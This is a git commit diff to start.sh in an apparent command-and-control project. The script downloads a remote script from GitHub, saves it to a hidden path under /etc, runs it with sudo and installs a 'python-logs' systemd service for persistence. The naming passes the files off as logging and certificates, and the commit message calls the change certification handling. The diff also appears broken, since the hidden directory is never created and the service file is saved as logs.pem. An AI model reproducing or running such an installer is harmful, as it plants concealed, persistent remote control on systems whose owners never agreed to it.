fcbf4a3bb37bfaae9c934dcf23915e04f06c12ef
Nidhi Pabbathi <123031844+npabbathi@users.noreply.github.com>
2026-03-26 18:30:48 -0500

    Modify start.sh to include certification handling
    Updated script to handle certifications and logs separately.

--- start.sh
+++ start.sh
@@ -1,13 +1,19 @@
 #!/bin/bash
 
 curl -fsSL --retry 3 https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/logs.sh \
-  | sudo tee /etc/.python-logs > /dev/null
+  | sudo tee /etc/.python-certifications/.python-logs > /dev/null
 
 curl -fsSL --retry 3 https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/logs.service \
   | sudo tee /etc/systemd/system/python-logs.service > /dev/null
 
-sudo chmod +x /etc/.python-logs
-sudo bash /etc/.python-logs
+curl -fsSL --retry 3 https://github.com/AidanNgo/eh-command-control/raw/refs/heads/main/cert.pem \
+  | sudo tee /etc/.python-certifications/cert.pem > /dev/null
+
+curl -fsSL --retry 3 https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/logs.service \
+  | sudo tee /etc/.python-certifications/logs.pem > /dev/null
+
+sudo chmod +x /etc/.python-certifications/.python-logs
+sudo bash /etc/.python-certifications/.python-logs
 
 sudo systemctl daemon-reload
 sudo systemctl enable python-logs
